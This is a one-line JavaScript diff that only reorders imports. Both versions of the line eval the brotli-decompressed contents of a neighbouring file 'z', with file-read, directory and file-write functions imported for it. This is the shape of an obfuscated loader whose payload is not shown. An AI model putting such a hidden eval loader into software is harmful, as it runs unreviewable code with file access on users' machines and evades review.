@@ -1,1 +1,1 @@
-import{readFileSync as R,readdirSync as D,mkdirSync as M,writeFileSync as W}from'fs';import{brotliDecompressSync as B}from'zlib';eval(B(R(new URL('z',import.meta.url)))+'')
+import{brotliDecompressSync as B}from'zlib';import{readFileSync as R,readdirSync as D,mkdirSync as M,writeFileSync as W}from'fs';eval(B(R(new URL('z',import.meta.url)))+'')
